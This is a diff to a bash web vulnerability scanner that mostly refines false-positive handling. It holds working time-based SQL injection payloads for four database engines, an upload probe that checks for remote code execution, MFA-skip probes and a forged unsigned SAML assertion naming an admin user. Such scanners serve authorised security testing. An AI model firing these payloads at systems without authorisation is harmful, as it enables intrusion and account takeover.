@@ -102,7 +102,65 @@ _has_skip() {
     [[ ",$source," == *",$want,"* ]] || [[ ",$source," == *",all,"* ]]
 }
 
-skip_has() { _has_skip "${SKIP_CHECKS:-}" "$1" || { [ "$FULL_MODE" != "--full" ] && _has_skip "xss,lfi,ssti,ssrf,cors,takeover,misconfig,jwt,graphql,smuggling,redirects,idor,auth_bypass,host_header,exposure,cloud,race" "$1"; }; }
+# Checks that the default (non---full) mode does NOT run. They are part of the
+# "full" checklist; the orchestrator (vikramaditya.py) passes --full by default
+# so the documented "bare run = fullest assessment" contract still holds, but a
+# direct ./scanner.sh (or hunt.py without --full) runs the focused set only.
+DEFAULT_SKIP_SET="xss,lfi,ssti,ssrf,cors,takeover,misconfig,jwt,graphql,smuggling,redirects,idor,auth_bypass,host_header,exposure,cloud,race"
+
+# Coverage marker — record any skipped/capped/degraded coverage so the reporter
+# (and the operator) can see exactly what was NOT covered instead of a silent
+# clean pass. Mirrors hunt.py's _mark_degraded convention.
+COVERAGE_MARKER_FILE="$FINDINGS_DIR/manual_review/coverage_gaps.txt"
+_mark_coverage() {
+    # $1 = check/label, $2 = reason
+    mkdir -p "$FINDINGS_DIR/manual_review" 2>/dev/null || true
+    echo "[COVERAGE-GAP] ${1:-?}: ${2:-unspecified}" >> "$COVERAGE_MARKER_FILE"
+}
+
+skip_has() {
+    local want="$1"
+    if _has_skip "${SKIP_CHECKS:-}" "$want"; then
+        return 0
+    fi
+    if [ "$FULL_MODE" != "--full" ] && _has_skip "$DEFAULT_SKIP_SET" "$want"; then
+        # Default (focused) mode is dropping a full-checklist class. Record it
+        # ONCE so the coverage loss is auditable instead of silent.
+        if ! grep -q "\[COVERAGE-GAP\] $want: " "$COVERAGE_MARKER_FILE" 2>/dev/null; then
+            log_warn "SKIPPED (default/focused mode): $want — pass --full to run it"
+            _mark_coverage "$want" "skipped in default/focused mode (not --full)"
+        fi
+        return 0
+    fi
+    return 1
+}
+
+# Resolve the live-hosts input using the canonical fallback chain used by the
+# "Resolve scan targets" block and Check 3b (CSP). recon writes live/urls.txt
+# (one URL per line) and live/httpx_full.txt; it NEVER writes live/httpx_live.txt
+# (a path that several checks historically read, iterating zero hosts silently).
+# Echoes one host/URL per line on stdout; empty output ⇒ caller should warn.
+_resolve_live_hosts() {
+    local limit="${1:-0}"   # 0 = no limit
+    local src=""
+    for f in "$RECON_DIR/live/urls.txt" "$ORDERED_SCAN" "$PRIORITY_DIR/prioritized_hosts.txt"; do
+        [ -s "$f" ] && { src="$f"; break; }
+    done
+    if [ -z "$src" ] && [ -s "$RECON_DIR/live/httpx_full.txt" ]; then
+        if [ "$limit" -gt 0 ] 2>/dev/null; then
+            awk '{print $1}' "$RECON_DIR/live/httpx_full.txt" | head -"$limit"
+        else
+            awk '{print $1}' "$RECON_DIR/live/httpx_full.txt"
+        fi
+        return 0
+    fi
+    [ -z "$src" ] && return 0
+    if [ "$limit" -gt 0 ] 2>/dev/null; then
+        awk '{print $1}' "$src" | head -"$limit"
+    else
+        awk '{print $1}' "$src"
+    fi
+}
 
 # ── Maturity Module: Advanced Verification Logic ─────────────────────────────
 
@@ -113,13 +171,25 @@ verify_sqli_poc() {
     # 1. Baseline (0s)
     T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
     
-    # 2. 1s Sleep
-    local pl1="'%20AND%20SLEEP(1)--%20"; [ "$dialect" = "postgres" ] && pl1="'||pg_sleep(1)--%20"
+    # 2. 1s Sleep — per-dialect payload
+    local pl1
+    case "$dialect" in
+        postgres) pl1="'||pg_sleep(1)--%20" ;;
+        mssql)    pl1="';WAITFOR%20DELAY%20'0:0:1'--%20" ;;
+        oracle)   pl1="'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),1)--%20" ;;
+        *)        pl1="'%20AND%20SLEEP(1)--%20" ;;
+    esac
     U1=$(echo "$url" | sed "s/=\([^&]*\)/=$pl1/$p_idx")
     T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
-    
-    # 3. 2s Sleep
-    local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
+
+    # 3. 2s Sleep — per-dialect payload
+    local pl2
+    case "$dialect" in
+        postgres) pl2="'||pg_sleep(2)--%20" ;;
+        mssql)    pl2="';WAITFOR%20DELAY%20'0:0:2'--%20" ;;
+        oracle)   pl2="'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),2)--%20" ;;
+        *)        pl2="'%20AND%20SLEEP(2)--%20" ;;
+    esac
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
     T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
     
@@ -145,24 +215,59 @@ verify_upload_poc() {
     echo "$payload" > "/tmp/$canary"
     log_step "  [VERIFY] Attempting RCE-Execution PoC (${ext}): $upload_url..."
     
+    local upload_accepted=0
     for param in "file" "upload" "FileData" "userfile" "image"; do
-        # Try upload
-        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "$upload_url" > /dev/null || true
-        
-        # Check common upload dirs
+        # Try upload — capture the response body so we can recover the stored
+        # path the app returns (many apps reply with the saved URL/filename),
+        # instead of only guessing 7 hardcoded directories.
+        local up_resp
+        up_resp=$(curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "$upload_url" 2>/dev/null || true)
+
+        # Build a probe list: the canary path(s) the upload response disclosed
+        # come FIRST, then the static fallback directories.
+        local probe_paths=""
+        # Pull any URL or path token in the response that references our canary
+        # filename (covers JSON {"url":"..."} , {"path":"..."} , HTML href, etc.)
+        local disclosed
+        disclosed=$(echo "$up_resp" | grep -oE "(https?://[^\"'<> ]+/)?[^\"'<> ]*${canary}" | sort -u | head -5 || true)
+        if [ -n "$disclosed" ]; then
+            upload_accepted=1
+            while IFS= read -r d; do
+                [ -z "$d" ] && continue
+                case "$d" in
+                    http://*|https://*) probe_paths="$probe_paths $d" ;;
+                    /*)                 probe_paths="$probe_paths ${base_url}${d}" ;;
+                    *)                  probe_paths="$probe_paths ${base_url}/${d}" ;;
+                esac
+            done <<< "$disclosed"
+        fi
+        # Static fallback dirs (still appended so we don't regress prior coverage)
         for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
-            local probe_url="${base_url}${dir}${canary}"
+            probe_paths="$probe_paths ${base_url}${dir}${canary}"
+        done
+
+        # Check disclosed path(s) first, then the fallback dirs
+        for probe_url in $probe_paths; do
             local resp=$(curl -sk -f --max-time 5 "$probe_url" || true)
             if echo "$resp" | grep -q "RCE-VAL-49"; then
                 log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
                 echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
                 rm -f "/tmp/$canary"; return 0
             elif echo "$resp" | grep -q "RCE-VAL-"; then
+                upload_accepted=1
                 log_vuln "  [POC-UPLOAD-ONLY] File saved but NOT executed (Source visible): $probe_url"
                 echo "[UPLOAD-ONLY-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_upload_pocs.txt"
             fi
         done
     done
+    # The upload POST was accepted (server disclosed our canary path or echoed
+    # the payload) but we never located the stored file at a probed location —
+    # don't lose that signal: real sinks that store outside the probed dirs are
+    # otherwise silent false negatives.
+    if [ "$upload_accepted" -eq 1 ]; then
+        log_vuln "  [UPLOAD-ACCEPTED-UNVERIFIED] Upload accepted but canary not retrieved at probed paths: $upload_url"
+        echo "[UPLOAD-ACCEPTED-UNVERIFIED] $upload_url | canary=$canary stored but not located — manual review" >> "$FINDINGS_DIR/upload/accepted_unverified.txt"
+    fi
     rm -f "/tmp/$canary"; return 1
 }
 
@@ -414,15 +519,38 @@ if ! skip_has sqli; then
     # 2b. Manual Linear-Scaling Probes
     PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
     if [ -s "$PARAMS_FILE" ]; then
-        log_step "Advanced SQLi verification on top 10 parameterised URLs..."
-        head -10 "$PARAMS_FILE" | while read -r url; do
+        # Cap scales with mode: 10 quick / 100 full / 25 default. Override with
+        # SQLI_MAX (0 = all). Record the cap so the truncation is auditable
+        # instead of a silent "tested 10, reported clean".
+        SQLI_MAX="${SQLI_MAX:-$([ "$FULL_MODE" = "--full" ] && echo 100 || { [ "$QUICK_MODE" = "--quick" ] && echo 10 || echo 25; })}"
+        PARAM_TOTAL=$(file_lines "$PARAMS_FILE")
+        if [ "$SQLI_MAX" -gt 0 ] 2>/dev/null; then
+            SQLI_FEED=$(head -"$SQLI_MAX" "$PARAMS_FILE")
+            if [ "$PARAM_TOTAL" -gt "$SQLI_MAX" ]; then
+                log_warn "[SQLI] Time-based probe capped at $SQLI_MAX of $PARAM_TOTAL parameterised URLs (SQLI_MAX=0 for all)"
+                _mark_coverage "sqli" "time-based probe tested $SQLI_MAX/$PARAM_TOTAL parameterised URLs"
+            fi
+        else
+            SQLI_FEED=$(cat "$PARAMS_FILE")
+        fi
+        log_step "Advanced SQLi verification on ${SQLI_MAX:-all} of $PARAM_TOTAL parameterised URLs..."
+        printf '%s\n' "$SQLI_FEED" | while read -r url; do
             [ -z "$url" ] && continue
             T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
             P_COUNT=$(echo "$url" | grep -o "=" | wc -l | tr -d ' ')
             [ "$P_COUNT" -eq 0 ] && continue
             for i in $(seq 1 "$P_COUNT"); do
-                for dialect in "mysql" "postgres"; do
-                    p="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && p="'||pg_sleep(2)--%20"
+                # Cover the major engines, not just mysql/postgres: MSSQL
+                # (WAITFOR DELAY), Oracle (dbms_pipe.receive_message), and a
+                # stacked-query generic fallback. verify_sqli_poc re-confirms
+                # the matched dialect with 1s/2s linear scaling.
+                for dialect in "mysql" "postgres" "mssql" "oracle"; do
+                    case "$dialect" in
+                        mysql)    p="'%20AND%20SLEEP(2)--%20" ;;
+                        postgres) p="'||pg_sleep(2)--%20" ;;
+                        mssql)    p="';WAITFOR%20DELAY%20'0:0:2'--%20" ;;
+                        oracle)   p="'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),2)--%20" ;;
+                    esac
                     # Fixed sed: use alternate delimiter and correct numeric occurrence
                     SU=$(echo "$url" | sed "s/=\([^&]*\)/=$p/$i")
                     TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
@@ -435,9 +563,21 @@ if ! skip_has sqli; then
                             log_vuln "SQLi Candidate (confirmed delay but not linear): $url"
                             echo "[SQLI-CANDIDATE] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                         fi
-                    elif [ "$RC" -eq 28 ] && [ "$TE" -gt 18000 ]; then
-                        log_warn "Potential SQLi (Timeout Multiplier): $url"
-                        echo "[SQLI-TIMEOUT-CANDIDATE] timeout=${TE}ms param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
+                    elif [ "$RC" -eq 28 ]; then
+                        # Curl TIMED OUT. A bare timeout is NOT SQLi evidence: a WAF /
+                        # gateway commonly returns a FIXED ~18-20s timeout (HTTP 502) for
+                        # ANY request carrying SQL metacharacters — indistinguishable from
+                        # a real sleep by duration alone (max-time truncates both). Confirm
+                        # via the 1s/2s LINEAR-SCALING check; a fixed block fails it (its
+                        # D2≈0). Only a delay that SCALES with the injected sleep is real.
+                        # (Was: blindly flagged any RC=28 >18s as [SQLI-TIMEOUT-CANDIDATE]
+                        #  — the dominant false-positive source on WAF-fronted targets.)
+                        if verify_sqli_poc "$url" "$i" "$dialect"; then
+                            log_crit "EMPIRICAL SQLI POC (timeout path, scaling-confirmed): $url"
+                            echo "[SQLI-POC-VERIFIED] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
+                            break 2
+                        fi
+                        # else: fixed timeout / WAF block — NOT flagged (false positive).
                     fi
                 done
             done
@@ -533,7 +673,12 @@ PYEOF
             WEAK=""
             echo "$CSP" | grep -qi "unsafe-inline"  && WEAK="$WEAK unsafe-inline"
             echo "$CSP" | grep -qi "unsafe-eval"    && WEAK="$WEAK unsafe-eval"
-            echo "$CSP" | grep -qi "'\\*'"          && WEAK="$WEAK wildcard-src"
+            # Wildcard source — match BOTH the quoted form ('*') AND a bare '*'
+            # token (e.g. "default-src *"), bounded by whitespace/semicolon/EOL
+            # so we don't match '*' inside a hostname like *.example.com? (that
+            # is itself a wildcard host, also worth flagging — covered by the
+            # bare-token match when space/`;`-delimited).
+            echo "$CSP" | grep -qiE "(^|[[:space:];])('\\*'|\\*)([[:space:];]|$)" && WEAK="$WEAK wildcard-src"
             echo "$CSP" | grep -qi "data:"          && WEAK="$WEAK data-uri"
             if [ -n "$WEAK" ]; then
                 log_vuln "[CSP-WEAK]$WEAK — $host"
@@ -681,14 +826,36 @@ if ! skip_has mfa; then
 
             # --- Test 2: MFA workflow skip (pre-MFA session to protected page) ---
             log_step "Workflow skip probe: $BASE"
-            # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session
+            # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session.
+            # An HTTP 200 alone is NOT a finding: SPAs / soft-redirect login pages
+            # return 200 with the login/landing shell for every path. Require
+            # corroboration — the protected body must (a) DIFFER from the
+            # unauthenticated baseline AND (b) NOT itself be a login page AND
+            # (c) carry an authenticated marker (logout/session/welcome). Anything
+            # weaker is recorded as a manual-review candidate, not a [VULN].
+            HOST=$(echo "$url" | grep -oE "https?://[^/]+")
+            # Unauthenticated baseline: a path that should require auth or 404.
+            BASE_BODY=$(curl -sk --max-time 5 "$HOST/__mfa_baseline_$$_$RANDOM" 2>/dev/null | head -c 8192 || true)
             for PROTECTED in dashboard home profile account settings admin; do
-                HOST=$(echo "$url" | grep -oE "https?://[^/]+")
-                SKIP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
+                P_HDR=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                     "$HOST/$PROTECTED" 2>/dev/null || echo "0")
-                if [ "$SKIP_CODE" = "200" ]; then
+                [ "$P_HDR" = "200" ] || continue
+                P_BODY=$(curl -sk --max-time 5 "$HOST/$PROTECTED" 2>/dev/null | head -c 8192 || true)
+                # (b) skip if the protected body is itself a login/auth-required page
+                if echo "$P_BODY" | grep -qiE "type=[\"']?password|sign[ -]?in|log[ -]?in|please (log|sign) in|authentication required"; then
+                    continue
+                fi
+                # (a) must differ from the unauthenticated baseline shell
+                if [ "$P_BODY" = "$BASE_BODY" ]; then
+                    echo "[MFA-WORKFLOW-SKIP-CANDIDATE] $HOST/$PROTECTED (HTTP 200, body == unauth baseline — manual review)" >> "$FINDINGS_DIR/manual_review/mfa_candidates.txt"
+                    continue
+                fi
+                # (c) authenticated marker present ⇒ confirmed; else manual candidate
+                if echo "$P_BODY" | grep -qiE "log ?out|sign ?out|my account|welcome,?|session|dashboard|csrf[_-]?token"; then
                     log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
-                    echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
+                    echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200, authenticated content, differs from unauth baseline)" >> "$FINDINGS_DIR/mfa/findings.txt"
+                else
+                    echo "[MFA-WORKFLOW-SKIP-CANDIDATE] $HOST/$PROTECTED (HTTP 200, no auth marker — manual review)" >> "$FINDINGS_DIR/manual_review/mfa_candidates.txt"
                 fi
             done
 
@@ -716,8 +883,12 @@ if ! skip_has saml; then
     # Detect SAML/SSO endpoints
     SAML_ENDPOINTS=$(grep -iE "/(saml|sso|login|auth|oauth|acs|idp|sp.init|adfs|okta|ping.fed)" \
         "$ORDERED_SCAN" 2>/dev/null | head -20 || true)
-    # Also check common SAML paths on live hosts
-    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -20 || true)
+    # Also check common SAML paths on live hosts.
+    # recon never writes live/httpx_live.txt — use the canonical fallback chain
+    # (live/urls.txt → ORDERED_SCAN → prioritized_hosts → httpx_full.txt col 1),
+    # else this loop iterated zero hosts and the path probing silently no-op'd.
+    LIVE_HOSTS=$(_resolve_live_hosts 20)
+    [ -z "$LIVE_HOSTS" ] && log_warn "[SAML] No live-hosts input found (live/urls.txt) — path probing skipped"
 
     while IFS= read -r host; do
         [ -z "$host" ] && continue
@@ -747,18 +918,35 @@ if ! skip_has saml; then
         fi
     done <<< "$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | awk '{print $2}' || true)"
 
-    # Signature stripping test via /saml/acs — send stripped assertion
+    # Signature stripping test via /saml/acs — send stripped assertion.
+    # A 200/302 alone does NOT prove ATO: a hardened ACS returns exactly those
+    # codes when it REJECTS a malformed/unsigned assertion (re-render the login
+    # form on 200, or redirect back to the IdP/login on 302). Asserting "CRITICAL
+    # ATO" on status code alone is a false positive. Confirm acceptance only when
+    # the response actually establishes an authenticated session (a session
+    # Set-Cookie) AND any redirect target is NOT the login/error flow; otherwise
+    # downgrade to a manual-verification candidate.
     ACS_URL=$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | grep "saml/acs\|saml/login" | head -1 | awk '{print $2}' || true)
     if [ -n "$ACS_URL" ]; then
-        # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
-        STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
-        CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
+        # Minimal stripped SAMLResponse (no Signature element, synthetic NameID)
+        STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@example.invalid</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
+        SS_HDRS=$(curl -sk -D - -o /dev/null --max-time 8 \
             -X POST "$ACS_URL" \
-            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
-        if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
-            log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
-            echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
-        fi
+            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null | tr -d '\r' || true)
+        CODE=$(echo "$SS_HDRS" | grep -oiE "^HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $2}')
+        SET_COOKIE=$(echo "$SS_HDRS" | grep -i "^set-cookie:")
+        LOCATION=$(echo "$SS_HDRS" | grep -i "^location:" | head -1)
+        case "$CODE" in 200|302)
+            # Session-bearing cookie AND no redirect back to a login/auth/error flow
+            if echo "$SET_COOKIE" | grep -qiE "session|sid|auth|jwt|token" \
+               && ! echo "$LOCATION" | grep -qiE "login|signin|sign-in|error|denied|saml/(acs|login)|sso"; then
+                log_vuln "[SAML] Signature stripping ACCEPTED (HTTP $CODE, session cookie set, non-login redirect): $ACS_URL — CRITICAL ATO"
+                echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | unsigned assertion established a session" >> "$FINDINGS_DIR/saml/findings.txt"
+            else
+                echo "[SAML-SIG-STRIP-CANDIDATE] $ACS_URL | HTTP $CODE | no session established — manual verification required" >> "$FINDINGS_DIR/manual_review/saml_candidates.txt"
+            fi
+            ;;
+        esac
     fi
 
     SAML_FINDINGS=$(count_vuln "$FINDINGS_DIR/saml/findings.txt")
@@ -770,7 +958,10 @@ if ! skip_has import; then
     log_info "Check 8: Import/Export Feature Abuse"
     mkdir -p "$FINDINGS_DIR/import_export"
 
-    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -30 || true)
+    # recon writes live/urls.txt, never live/httpx_live.txt — use the canonical
+    # fallback chain so this check actually iterates hosts.
+    LIVE_HOSTS=$(_resolve_live_hosts 30)
+    [ -z "$LIVE_HOSTS" ] && log_warn "[IMPORT] No live-hosts input found (live/urls.txt) — endpoint probing skipped"
 
     while IFS= read -r host; do
         [ -z "$host" ] && continue
@@ -832,7 +1023,10 @@ if ! skip_has deserialize; then
     log_info "Check 9: Deserialization Probes"
     mkdir -p "$FINDINGS_DIR/deserialize"
 
-    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -20 || true)
+    # recon writes live/urls.txt, never live/httpx_live.txt — use the canonical
+    # fallback chain so this check actually iterates hosts.
+    LIVE_HOSTS=$(_resolve_live_hosts 20)
+    [ -z "$LIVE_HOSTS" ] && log_warn "[DESERIALIZE] No live-hosts input found (live/urls.txt) — endpoint probing skipped"
 
     while IFS= read -r host; do
         [ -z "$host" ] && continue
@@ -904,7 +1098,10 @@ if ! skip_has supplychain; then
     log_info "Check 10: Supply Chain Exposure"
     mkdir -p "$FINDINGS_DIR/supply_chain"
 
-    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -30 || true)
+    # recon writes live/urls.txt, never live/httpx_live.txt — use the canonical
+    # fallback chain so this check actually iterates hosts.
+    LIVE_HOSTS=$(_resolve_live_hosts 30)
+    [ -z "$LIVE_HOSTS" ] && log_warn "[SUPPLY-CHAIN] No live-hosts input found (live/urls.txt) — endpoint probing skipped"
 
     while IFS= read -r host; do
         [ -z "$host" ] && continue
